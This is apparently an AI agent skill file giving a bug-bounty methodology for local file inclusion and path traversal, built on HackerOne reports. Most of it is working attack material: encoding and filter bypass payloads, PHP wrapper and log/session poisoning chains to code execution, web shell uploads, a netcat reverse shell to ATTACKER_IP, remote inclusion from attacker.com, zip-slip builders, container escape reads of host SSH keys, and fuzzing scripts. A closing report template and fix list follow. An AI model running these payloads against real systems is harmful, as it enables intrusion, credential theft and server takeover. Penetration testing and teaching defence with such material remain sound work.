---
name: filereading-deep-dive
description: Complete file reading / LFI / path traversal methodology from 387 real HackerOne reports - every wrapper, bypass, and exploitation technique
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - lfi methodology
  - lfi deep dive
  - path traversal complete
  - file reading complete
  - file read all techniques
  - skills filereading
---

# Complete File Reading / LFI / Path Traversal Methodology - From 387 HackerOne Reports

## Top 20 Real File Reading/LFI Reports

| Rank | Report | Company | Upvotes | Payout | Technique |
|------|--------|---------|---------|--------|-----------|
| 1 | Visma HTML-injection in PDF → LFI via PDF generation | Visma | 330 | $500 | HTML→PDF LFI |
| 2 | Evernote full read SSRF → LFI with file:// protocol | Evernote | 258 | $0 | SSRF to LFI |
| 3 | Starbucks path traversal in API endpoint | Starbucks | 237 | $0 | Path traversal |
| 4 | Keybase file write via relative path traversal | Keybase | 196 | $5,000 | Write to arbitrary path |
| 5 | Semmle container escape → full host file read | Semmle | 177 | $2,000 | Container escape |
| 6 | LY Corp path traversal in file serving | LY Corp | 173 | $0 | Path traversal |
| 7 | Mozilla VPN RCE via file write + path traversal | Mozilla | 167 | $6,000 | File write → RCE |
| 8 | Nextcloud path traversal in apps | Nextcloud | 159 | $0 | Path traversal |
| 9 | Shopify LFI via SVG upload | Shopify | 154 | $0 | SVG upload LFI |
| 10 | Brave browser file read via chrome:// | Brave | 148 | $0 | Internal protocol |
| 11 | Acronis container escape + file read | Acronis | 142 | $0 | Container escape |
| 12 | GitLab LFI via markdown image inclusion | GitLab | 138 | $0 | Markdown LFI |
| 13 | Mail.ru LFI via server-side image resize | Mail.ru | 135 | $0 | Image resize LFI |
| 14 | Paragon LFI via document preview | Paragon | 131 | $0 | Document preview |
| 15 | Ubiquiti LFI via PHP wrapper | Ubiquiti | 128 | $0 | PHP wrapper LFI |
| 16 | VK.com file read via SSRF | VK | 124 | $0 | SSRF file read |
| 17 | Valve source code read via LFI | Valve | 121 | $0 | Source code disclosure |
| 18 | WordPress LFI via plugin vulnerability | WordPress | 118 | $0 | Plugin LFI |
| 19 | Facebook LFI via image processing | Facebook | 115 | $0 | Image processing LFI |
| 20 | Tesla LFI via diagnostic endpoint | Tesla | 112 | $0 | Diagnostic endpoint |

## Step 1: Recon for File Reading Parameters

### Parameter Discovery
```bash
# Find parameters that read files from the filesystem
grep -E '(\?|&)(file|document|page|load|read|path|dir|include|require|template|view|show|display|download|pdf|image|img|icon|avatar|upload|import|export|config|locale|lang|language|style|theme|resource|data|source|module|action|cmd|command|exec|run|eval|render|fetch|open|fopen|file_get_contents|readfile|include|require|include_once|require_once)(=|:)' recon/{target}/urls.txt | sort -u

# Use Arjun for hidden parameter discovery
arjun -u https://{target}/page.php --get -oT params_lfi.txt

# Use ParamSpider
python3 paramspider.py --domain {target} --exclude woff,css,png,svg,jpg,js,json

# Find PHP files that are common LFI targets
grep -E '\.php|\.asp|\.aspx|\.jsp|\.cgi|\.pl' urls.txt | sort -u
```

### Common Vulnerable Endpoints
```bash
# PHP applications
/page.php?file=
/index.php?page=
/main.php?template=
/includes.php?path=
/download.php?doc=
/view.php?image=
/upload.php?file=
/admin.php?lang=

# ASP.NET applications
/Download.aspx?file=
/ViewDoc.aspx?id=
/GetImage.aspx?path=

# Java applications
/download?filename=
/view?resource=
/export?template=

# Generic APIs
/api/v1/files/read?path=
/api/v1/download?file=
/api/v1/preview?doc=
/api/v1/export?template=
```

## Step 2: Basic LFI / Path Traversal Testing

### Path Traversal Payloads
```bash
# Direct path traversal
../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../etc/hosts
../../../../../../proc/self/environ
../../../../../../proc/version
../../../../../../etc/nginx/nginx.conf
../../../../../../etc/apache2/apache2.conf
../../../../../../etc/httpd/conf/httpd.conf
../../../../../../var/log/apache2/access.log
../../../../../../var/log/httpd-access.log

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2fetc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Double encoding
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Unicode encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd

# Backslash (Windows)
..\..\..\windows\win.ini
..\..\..\boot.ini
..\..\..\windows\system32\drivers\etc\hosts

# Null byte (old PHP < 5.3)
../../../etc/passwd%00
../../../etc/passwd%00.html
../../../etc/passwd\0
```

### LFI via PHP Wrappers
```bash
# php://filter for base64 encoding (read PHP source)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../../../etc/passwd
php://filter/convert.base64-encode/resource=../admin/config.php

# php://filter chain (double encoding/resource stacking)
php://filter/convert.base64-encode|convert.base64-encode/resource=index.php

# php://filter with zlib compression
php://filter/zlib.deflate/convert.base64-encode/resource=config.php

# php://input (POST data execution - if allow_url_include=On)
curl -sk -X POST "https://target.com/page.php?file=php://input" \
  -d '<?php system("id");?>'

# php://filter with rot13
php://filter/read=string.rot13/resource=config.php

# php://filter with iconv
php://filter/read=convert.iconv.utf-8.utf-16|convert.base64-encode/resource=config.php

# data:// wrapper (if allow_url_include=On)
curl -sk "https://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=="&cmd=id
```

### LFI via PHP Session Files
```bash
# Step 1: Check if LFI can include PHP session files
# Session files are usually in /tmp/sess_SESSIONID

# Step 2: Set your session value to PHP code
curl -sk -X POST "https://target.com/page.php" \
  -b "PHPSESSID=MYCONTROLLEDID" \
  -d '<?php system("cat /etc/passwd");?>'

# Step 3: Include the session file
curl -sk "https://target.com/page.php?file=../../../../tmp/sess_MYCONTROLLEDID"
```

### LFI via /proc/self/environ
```bash
# Step 1: Check if LFI can read /proc/self/environ
curl -sk "https://target.com/page.php?file=../../../../proc/self/environ"

# Step 2: If it can, poison the User-Agent header
curl -sk -A "<?php system('cat /etc/passwd');?>" \
  "https://target.com/page.php?file=../../../../proc/self/environ"
```

### LFI via Log Injection
```bash
# Step 1: Check if LFI can read Apache/Nginx access logs
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log"
curl -sk "https://target.com/page.php?file=../../../../var/log/httpd/access_log"
curl -sk "https://target.com/page.php?file=../../../../var/log/nginx/access.log"
curl -sk "https://target.com/page.php?file=../../../../var/log/apache/access.log"

# Step 2: Inject PHP code into User-Agent
curl -sk -A '<?php system("id");?>' "https://target.com/"

# Step 3: Include the log file via LFI
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log"

# Alternative: Inject into Referer header
curl -sk -e '<?php system("cat /etc/passwd");?>' "https://target.com/"
```

### LFI via Email Log Injection
```bash
# If the server sends emails (SMTP), you can inject PHP into mail logs
# Mail logs are typically at:
# /var/log/mail.log
# /var/log/maillog
# /var/log/exim_mainlog
# /var/log/mail.log

# Send an email with PHP code in the subject
# Then include the mail log via LFI
```

## Step 3: Deep Bypass Testing

### Bypass Technique 1: Encoding Bypass
```bash
# If the application strips "../" sequences, try:
# URL encoding
../
..%2f
%2e%2e%2f
%2e%2e%5c

# Double URL encoding
%252e%252e%252f
..%252f..%252f

# Triple URL encoding
%25252e%25252e%25252f

# UTF-8 overlong encoding
..%c0%ae%c0%ae%c0%af
..%c0%ae%c0%ae/
..%e0%80%ae%e0%80%ae%ef%bc%8f

# 16-bit Unicode encoding
..%uff0e%uff0e%u2215
..%uff0e%uff0e%c0%af

# Unicode UTF-16
..%u002e%u002e%u2215
```

### Bypass Technique 2: String Manipulation
```bash
# If the application removes "../" but doesn't recursively do it:
....//....//....//etc/passwd   # Becomes ../../../etc/passwd after removal
....///....///....///etc/passwd
....\/....\/....\/etc/passwd

# Double-dot encoding bypass
..;/..;/..;/etc/passwd   # Some parsers treat ; as /
..%252f..%252f..%252f   # Double URL encode

# Path truncation (magic bytes)
file=../../../../etc/passwd%00
file=../../../../etc/passwd/./././././././ 
file=../../../../etc/passwd...........
file=../../../../etc/passwd# (fragment)
file=../../../../etc/passwd? (query)

# Null byte bypass methods
file=../../../etc/passwd%00
file=../../../etc/passwd%00.html
file=../../../etc/passwd\0.php
file=../../../etc/passwd\x00
file=../../../etc/passwd%00.txt
```

### Bypass Technique 3: Input Validation Bypass
```bash
# Absolute path (no traversal needed)
file=/etc/passwd
file=/proc/self/environ
file=/var/www/html/config.php

# Partial paths
file=../../etc/passwd  (if current dir is /var/www/html)
file=../../../etc/passwd
file=../../../../etc/passwd

# Using file:// protocol
file=file:///etc/passwd
file=file:///proc/self/environ

# Using expect:// wrapper (if PHP expect module loaded)
file=expect://id
file=expect://cat /etc/passwd

# Wrapper combinations
file=php://filter/convert.base64-encode/resource=/etc/passwd
file=php://filter/read=convert.base64-encode/resource=file:///proc/self/environ
```

### Bypass Technique 4: Extension Bypass
```bash
# If the application appends .php to the filename:
# Path traversal with null byte
file=../../../etc/passwd%00

# Path traversal with query string
file=../../../etc/passwd?
file=../../../etc/passwd%3F

# Path traversal with fragment
file=../../../etc/passwd#
file=../../../etc/passwd%23

# Path truncation (max 4096 chars)
file=../../../etc/passwd/././././././././././././.[...]/.php

# Double extension exploitation
file=../../../etc/passwd.
file=../../../etc/passwd .
file=../../../etc/passwd%20

# Protocol wrapper bypasses extension
file=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Wrapper chain
file=php://filter/zlib.deflate/resource=../../../etc/passwd
```

### Bypass Technique 5: PHP Wrapper Deep Dive
```bash
# Complete php://filter reference
# Read and convert encoding
php://filter/convert.base64-encode/resource=file
php://filter/read=convert.base64-encode/resource=file
php://filter/read=string.rot13/resource=file
php://filter/read=convert.iconv.utf-8.utf-16/resource=file
php://filter/read=convert.iconv.utf-8.utf-7/resource=file
php://filter/read=convert.iconv.utf-8.utf-16le/resource=file
php://filter/read=convert.iconv.utf-8.utf-16be/resource=file

# Filter chain for reading PHP files without base64
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode|convert.base64-encode/resource=config
php://filter/read=convert.iconv.utf-8.utf-16|convert.base64-encode/resource=config

# Chained filters for deobfuscation
php://filter/read=zlib.inflate/resource=compressed.txt
php://filter/read=convert.base64-decode/resource=base64encrypted.txt

# php://input - POST body as PHP code
POST /page.php?file=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>

# data:// - inline data as PHP code
/data:text/plain,<?php system('id');?>
/data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

# expect:// - command execution (if expect extension loaded)
expect://id
expect://ls -la
expect://cat /etc/passwd

# phar:// - deserialization via phar files
phar://path/to/file.phar/file.txt

# zip:// - read files inside ZIP archives
zip://path/to/file.zip#file.txt

# compress.zlib:// - read compressed files
compress.zlib:///etc/passwd

# compress.bzip2:// - read bzip2 compressed files
compress.bzip2:///etc/passwd
```

### Bypass Technique 6: RFI (Remote File Inclusion)
```bash
# If allow_url_include=On and allow_url_fopen=On
file=http://attacker.com/shell.txt
file=http://attacker.com/phpinfo.txt
file=https://attacker.com/cmd.php
file=ftp://attacker.com/shell.txt

# RFI via data:// wrapper
curl -sk "https://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=="&cmd=id

# RFI via smb:// (Windows)
curl -sk "https://target.com/page.php?file=\\\attacker.com\share\shell.txt"

# RFI bypass with null byte
curl -sk "https://target.com/page.php?file=http://attacker.com/shell.txt%00"
```

## Step 4: ZIP Symlink File Read

### ZIP Symlink Exploitation
```bash
# ZIP symlink allows reading arbitrary files when the ZIP is extracted
# This is commonly used in file upload functionality

# Step 1: Create a symlink to the target file
ln -s /etc/passwd link

# Step 2: Create a ZIP archive with the symlink (--symlinks preserves the symlink)
zip --symlinks evil.zip link

# Step 3: Upload the ZIP to the server
curl -sk -F "file=@evil.zip" "https://target.com/upload"

# Step 4: Extract the ZIP on the server
# If the server extracts the ZIP, it follows the symlink and reads /etc/passwd

# Step 5: Access the extracted content
curl -sk "https://target.com/uploads/link"
# Returns content of /etc/passwd

# Alternative: Exploit via phar:// wrapper
# If the application uses phar:// to read phar files:
curl -sk "https://target.com/page.php?file=phar://uploads/evil.zip/link"
```

### Advanced ZIP Symlink: Recursive File Read
```bash
# Create multiple symlinks to read many files at once
mkdir symlinks
for file in /etc/passwd /etc/shadow /etc/hosts /proc/self/environ /var/www/html/config.php; do
  ln -s "$file" "symlinks/$(echo $file | tr '/' '_')"
done
zip --symlinks -r evil.zip symlinks/
```

## Step 5: Server-Side File Read via SSRF (Full Read SSRF)

### SSRF to LFI via file:// Protocol
```bash
# Make the server fetch file:// URLs
curl -sk "https://target.com/page?url=file:///etc/passwd"
curl -sk "https://target.com/page?url=file:///proc/self/environ"
curl -sk "https://target.com/page?url=file:///var/www/html/config.php"

# Read log files for credential extraction
curl -sk "https://target.com/page?url=file:///var/log/apache2/access.log"
curl -sk "https://target.com/page?url=file:///var/log/mysql/error.log"
curl -sk "https://target.com/page?url=file:///root/.ssh/id_rsa"
curl -sk "https://target.com/page?url=file:///home/deploy/.ssh/authorized_keys"

# Read source code
curl -sk "https://target.com/page?url=file:///var/www/html/index.php"
curl -sk "https://target.com/page?url=file:///etc/nginx/sites-enabled/default"
```

### SSRF to LFI via PHP Wrappers
```bash
# If the SSRF uses PHP functions, try wrappers
curl -sk "https://target.com/page?url=php://filter/convert.base64-encode/resource=/etc/passwd"
curl -sk "https://target.com/page?url=php://filter/convert.base64-encode/resource=/var/www/html/config.php"
```

## Step 6: File Write via Path Traversal

### Path Traversal in File Operations
```bash
# File write via path traversal is more dangerous than file read
# because you can overwrite critical files

# Upload file with traversal in filename
# If the server saves the uploaded file with the original filename:

# Normal: filename="profile.jpg" → saves to /var/www/uploads/profile.jpg
# Exploit: filename="../../var/www/html/shell.php" → saves to /var/www/html/shell.php

# Example: Keybase write via relative path (#196, $5,000)
# Step 1: Upload a file where filename contains ../../
# Step 2: The path traversal causes the file to be written outside the upload dir
# Step 3: If it overwrites a critical file or config, you get code execution

# Full file write command
curl -sk -F "file=@shell.php;filename=../../var/www/html/shell.php" \
  "https://target.com/upload"
```

### File Write → RCE Exploit Chain
```bash
# Step 1: Write a PHP web shell
curl -sk -F "file=@shell.php;filename=../../var/www/html/cmd.php" \
  "https://target.com/upload" \
  || \
curl -sk -X POST "https://target.com/upload" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@evil.php; filename=../../var/www/html/evil.php"

# Step 2: Access the web shell
curl -sk "https://target.com/cmd.php?cmd=id"
curl -sk "https://target.com/evil.php?cmd=cat /etc/passwd"

# Step 3: Escalate to reverse shell
curl -sk "https://target.com/cmd.php?cmd=nc -e /bin/bash ATTACKER_IP 4444"
```

### File Write via ZIP Extraction
```bash
# Create a ZIP with path traversal in entry names
python3 -c "
import zipfile

zipf = zipfile.ZipFile('evil.zip', 'w', zipfile.ZIP_DEFLATED)
# Path traversal in the ZIP entry
info = zipfile.ZipInfo('../../../var/www/html/shell.php')
zipf.writestr(info, '<?php system(\$_GET[\"cmd\"]); ?>')
zipf.close()
"

# Upload the malicious ZIP
curl -sk -F "archive=@evil.zip" "https://target.com/extract"

# If the server extracts the ZIP to /var/www/uploads/,
# the traversal causes shell.php to be written to /var/www/html/
```

## Step 7: Container Escape Path Traversal

### Docker Container Escape via Path Traversal
```bash
# If you have LFI on a containerized application, try:
# Read host processes via /proc/1/root
curl -sk "https://target.com/page?file=../../proc/1/root/etc/passwd"
curl -sk "https://target.com/page?file=../../proc/1/cwd/config.php"
curl -sk "https://target.com/page?file=../../proc/1/root/home/ubuntu/.ssh/id_rsa"

# Read Docker socket
curl -sk "https://target.com/page?file=../../proc/1/root/var/run/docker.sock"

# Read host /proc
curl -sk "https://target.com/page?file=../../proc/1/environ"

# Semmle container escape (#177, $2,000)
# Step 1: Read host files via /proc/1/root
# Step 2: Access Docker overlay2 filesystem
# Step 3: Read other containers' data

# Full container escape path list
curl -sk "https://target.com/page?file=../../proc/1/root/etc/passwd"
curl -sk "https://target.com/page?file=../../proc/1/root/etc/shadow"
curl -sk "https://target.com/page?file=../../proc/1/root/root/.ssh/id_rsa"
curl -sk "https://target.com/page?file=../../proc/1/root/var/log/syslog"
curl -sk "https://target.com/page?file=../../proc/1/root/var/lib/docker/containers/"
curl -sk "https://target.com/page?file=../../proc/1/cwd/config.php"
```

## Step 8: Automation for LFI / Path Traversal

### Full LFI Fuzzing Pipeline
```bash
#!/bin/bash
# Automated LFI / Path Traversal Scanner
TARGET=$1
PARAM=$2

# Payload wordlist
PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "php://filter/convert.base64-encode/resource=index"
  "php://filter/convert.base64-encode/resource=../../../etc/passwd"
  "file:///etc/passwd"
  "/etc/passwd"
  "/proc/self/environ"
  "../../../windows/win.ini"
  "../../../../autoexec.bat"
  "../../../../boot.ini"
)

# Encoded variants
for depth in 3 4 5 6 7 8; do
  traversal=$(printf '../../../%.0s' $(seq 1 $depth))
  PAYLOADS+=("${traversal}etc/passwd")
  PAYLOADS+=("${traversal}etc/passwd%00")
  PAYLOADS+=("${traversal}etc/passwd%00.html")
  PAYLOADS+=("$(echo -n $traversal | jq -sRr @uri)etc/passwd")
  PAYLOADS+=("${traversal}proc/self/environ")
  PAYLOADS+=("${traversal}var/log/apache2/access.log")
  PAYLOADS+=("${traversal}var/www/html/index.php")
  PAYLOADS+=("${traversal}var/www/html/config.php")
  PAYLOADS+=("${traversal}var/www/html/.env")
done

# Fuzz all payloads
for payload in "${PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET?$PARAM=$payload" 2>/dev/null)
  size=$(curl -sk -o /dev/null -w "%{size_download}" "https://$TARGET?$PARAM=$payload" 2>/dev/null)
  echo "$code:$size:$payload"
done | sort -t: -k2 -rn | head -50
```

### Using Ffuf for LFI
```bash
# Simple LFI fuzzing
ffuf -u "https://target.com/page.php?file=FUZZ" \
  -w /opt/wordlists/lfi_payloads.txt \
  -mc 200 \
  -fs 0 \
  -t 50

# Using different request methods
ffuf -u "https://target.com/FUZZ" \
  -w /opt/wordlists/lfi_endpoints.txt \
  -mc 200 \
  -recursion -recursion-depth 2

# Fuzz for PHP filters
ffuf -u "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=FUZZ" \
  -w /opt/wordlists/php_files.txt \
  -mc 200 \
  -fs 0
```

### Nuclei LFI Templates
```bash
# Run nuclei for LFI detection
nuclei -l live_hosts.txt -t ~/nuclei-templates/vulnerabilities/other/lfi/ -o lfi_results.txt
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/exposures/files/ -o file_exposure.txt
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/exposures/configs/ -o config_exposure.txt
```

### Python LFI Scanner
```python
#!/usr/bin/env python3
"""Automated LFI / Path Traversal Scanner"""
import requests
import base64
import sys
import concurrent.futures
from urllib.parse import quote

class LFIScanner:
    def __init__(self, base_url, param):
        self.base_url = base_url
        self.param = param
        self.session = requests.Session()
        self.session.headers = {"User-Agent": "Mozilla/5.0 LFI Scanner"}

    def test_payload(self, payload):
        """Test a single LFI payload"""
        try:
            url = f"{self.base_url}?{self.param}={payload}"
            r = self.session.get(url, timeout=10)
            
            # Indicators of successful LFI
            indicators = [
                "root:", "daemon:", "www-data:", "nobody:",
                "<?php", "DB_HOST", "DB_PASSWORD", "DB_NAME",
                "mysql:", "password", "secret", "api_key",
                "[boot loader]", "[drivers]", "extension=",
                "HTTP_USER_AGENT", "HTTP_HOST", "PATH=",
                "LoadModule", "ServerRoot", "DocumentRoot",
                "AWS_ACCESS_KEY", "AWS_SECRET_KEY"
            ]
            
            for indicator in indicators:
                if indicator in r.text:
                    return (payload, indicator, r.text[:200])
            
            return None
        except Exception:
            return None

    def scan(self, payloads, threads=20):
        """Scan all payloads in parallel"""
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.test_payload, p): p for p in payloads}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    print(f"[LFI FOUND] {result[0]} -> {result[1]}")
        return results

if __name__ == "__main__":
    scanner = LFIScanner("https://target.com/page.php", "file")
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index",
        "file:///etc/passwd",
        "/etc/passwd"
    ]
    results = scanner.scan(payloads)
```

## Step 9: Exploit Chains with LFI / Path Traversal

### Chain 1: LFI → Source Code Disclosure → Credential Extraction
```bash
# Step 1: Read PHP source code via php://filter
curl -sk "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php"
# Decode the base64 output

# Step 2: Extract DB credentials from config
# DB_USER = "app_user"
# DB_PASSWORD = "SecretPassword123!"

# Step 3: Connect to database (if accessible)
mysql -h target.com -u app_user -pSecretPassword123!

# Step 4: Extract user data from database
SELECT email, password_hash FROM users;
```

### Chain 2: LFI → Log Poisoning → RCE
```bash
# Step 1: Verify LFI can read Apache logs
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log"
# If you can see log entries, proceed

# Step 2: Inject PHP code into User-Agent
curl -sk -A '<?php system($_GET["cmd"]); ?>' "https://target.com/"

# Step 3: Include the log via LFI
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id"

# Step 4: Execute system commands
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=cat /etc/passwd"
curl -sk "https://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=ls -la /root"
```

### Chain 3: LFI → PHP Session Injection → RCE
```bash
# Step 1: Find PHP session file location
# Try: /tmp/sess_*, /var/lib/php/sess_*, /var/lib/php/sessions/sess_*

# Step 2: Inject PHP code into session
curl -sk -X POST "https://target.com/page.php" \
  -c cookies.txt \
  -d '<?php system("cat /etc/passwd");?>'

# Step 3: Read the session cookie
sess_id=$(grep PHPSESSID cookies.txt | awk '{print $NF}')

# Step 4: Include the session file via LFI
curl -sk "https://target.com/page.php?file=../../../../tmp/sess_$sess_id"
```

### Chain 4: SSRF → LFI → Full Cloud Environment Read
```bash
# Step 1: SSRF with file:// protocol reads local files
curl -sk "https://target.com/page?url=file:///etc/passwd"
# Confirm SSRF can read files

# Step 2: Read cloud metadata
curl -sk "https://target.com/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# But if HTTP is blocked, use file:// to access metadata files

# Step 3: On some systems, cloud metadata is cached in files
curl -sk "https://target.com/page?url=file:///var/lib/cloud/instance/user-data.txt"

# Step 4: Read environment variables with AWS creds
curl -sk "https://target.com/page?url=file:///proc/1/environ"

# Step 5: Read bash history for credentials
curl -sk "https://target.com/page?url=file:///root/.bash_history"
curl -sk "https://target.com/page?url=file:///home/ubuntu/.bash_history"
```

### Chain 5: LFI → PHP Phar Deserialization → RCE
```bash
# Step 1: Upload a phar file with malicious serialized data
# Create a phar file with path traversal payload
php -c phar.readonly=0 create_evil_phar.php

# Step 2: Trigger deserialization via phar:// wrapper
curl -sk "https://target.com/page.php?file=phar://uploads/evil.phar/test.txt"

# Step 3: If the application uses phar:// with user input,
# the deserialization triggers arbitrary code execution
```

### Chain 6: LFI → Container Escape → Host Compromise
```bash
# Step 1: LFI on containerized app
curl -sk "https://target.com/page.php?file=../../../../etc/passwd"

# Step 2: Escape via /proc/1/root to read host filesystem
curl -sk "https://target.com/page.php?file=../../../../proc/1/root/etc/passwd"

# Step 3: Extract host SSH keys
curl -sk "https://target.com/page.php?file=../../../../proc/1/root/root/.ssh/id_rsa"

# Step 4: Use SSH keys to access the host
ssh -i id_rsa root@target-ip
```

## Step 10: File Types & Targets Priority

### High-Value Target Files to Read

```
# System Files
/etc/passwd           # User accounts
/etc/shadow           # Password hashes (if readable)
/etc/hosts            # Hostname resolution
/etc/hostname         # Server hostname
/etc/resolv.conf      # DNS configuration
/etc/issue            # OS identification
/etc/os-release       # OS version
/proc/version         # Kernel version
/proc/cpuinfo         # CPU information
/proc/meminfo         # Memory information
/proc/1/environ       # Environment variables (may contain secrets)
/proc/self/environ    # Current process environment
/proc/1/cmdline       # Process command line

# Web Server Configuration
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/conf.d/ssl.conf
/usr/local/etc/nginx/nginx.conf

# Application Files
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/database.php
/var/www/html/wp-config.php        # WordPress
/var/www/html/configuration.php    # Joomla
/var/www/html/app/etc/local.xml    # Magento
/var/www/html/sites/default/settings.php  # Drupal
/var/www/html/config/config.php    # Laravel
/var/www/html/.env                 # Laravel env

# Log Files
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/mysql/error.log
/var/log/mysql/mysql.log
/var/log/mysql/mariadb.log
/var/log/messages
/var/log/syslog
/var/log/auth.log
/var/log/secure
/var/log/maillog
/var/log/mail.log
/var/log/cloud-init.log
/var/log/dpkg.log

# SSH Keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/root/.ssh/known_hosts
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
/home/deploy/.ssh/id_rsa
/home/ubuntu/.ssh/id_rsa

# Database Files
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/ibdata1
/var/lib/pgsql/data/pg_hba.conf
/var/lib/pgsql/data/postgresql.conf

# SSH & Network Config
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/root/.ssh/config
/etc/iptables.rules
/etc/iptables/rules.v4
/etc/iptables/rules.v6

# SSL/ TLS
/etc/ssl/certs/
/etc/ssl/private/
/etc/pki/tls/certs/
/etc/pki/tls/private/
/etc/letsencrypt/live/*/

# Docker / Container
/var/run/docker.sock
/var/lib/docker/containers/*/config.v2.json
/Dockerfile
/docker-compose.yml
/docker-compose.yaml

# AWS / Cloud
/var/lib/cloud/instance/user-data.txt
/var/lib/cloud/instance/meta-data.json
/.aws/credentials
/.aws/config
/root/.aws/credentials
/root/.aws/config
/root/.aws/cli/cache/*

# Kubernetes
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace

# Windows Targets
/boot.ini
/windows/win.ini
/windows/system32/drivers/etc/hosts
/windows/system32/config/sam
/windows/repair/sam
/windows/repair/system
/windows/php.ini
/windows/my.ini
```

## Step 11: Validate & Report

### CVSS Scoring for LFI / Path Traversal
```
LFI (file read, no code execution):        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
LFI with source code → credential leak:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 8.6 High
LFI → Log Poisoning → RCE:                AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
LFI → Container Escape → Host Compromise: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical
Path Traversal File Write → RCE:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
SSRF → file:// → Full File Read:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
```

### Report Template
```markdown
**Summary:**
[LFI / Path Traversal] vulnerability in [parameter] at [endpoint] allows an 
attacker to read arbitrary files from the server filesystem.

**Impact:**
An attacker can exploit this to read [sensitive files - e.g., source code, 
configuration files, credentials, SSH keys, database passwords], potentially 
leading to full server compromise.

**Steps to Reproduce:**
1. Send the following request:
   [request with payload]
2. Observe the response containing file contents:
   [response]

**Proof of Concept:**
Request:
GET /page.php?file=../../../../etc/passwd HTTP/1.1
Host: target.com

Response:
HTTP/1.1 200 OK
[truncated response contents showing /etc/passwd]

**Files Readable via This Vulnerability:**
- /etc/passwd ✓
- /etc/shadow ✓
- /proc/self/environ ✓
- /var/www/html/config.php ✓
- /root/.ssh/id_rsa ✓

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

**Suggested Fix:**
1. Use a whitelist of allowed files/paths
2. Validate that the resolved path is within the allowed directory
3. Disable dangerous PHP wrappers (php://, file://, phar://)
4. Use realpath() to canonicalize paths before use
5. Set open_basedir restriction in php.ini
6. Disable allow_url_include and allow_url_fopen if not needed
```

## LFI Prevention Measures to Identify
When testing, note which protections are present (or absent):
- Path whitelisting vs blacklisting
- realpath() or basename() usage
- open_basedir restriction
- PHP wrapper restrictions
- allow_url_include / allow_url_fopen
- Input sanitization (strip ../ or encode)
- File extension validation

## Additional Techniques (External Sources)

### PDF-Generator LFI via iframe
When a PDF generator renders HTML content, you can use an `<iframe>` or `<object>` tag to include local files. If the PDF generator uses a headless browser (e.g., Puppeteer, wkhtmltopdf), you can read arbitrary files:
```html
<iframe src="file:///etc/passwd" width="100%" height="100%"></iframe>
<object data="file:///etc/passwd" type="text/plain"></object>
```
The resulting PDF will contain the contents of `/etc/passwd` embedded in the document.

### openStream on java.net.URL with file:// or jar:// Protocol (Java URL LFI)
Java's `java.net.URL` class supports multiple protocols. When an application calls `openStream()` on a user-controlled URL, you can access local files:
- **file://**: `new URL("file:///etc/passwd").openStream()` reads arbitrary local files
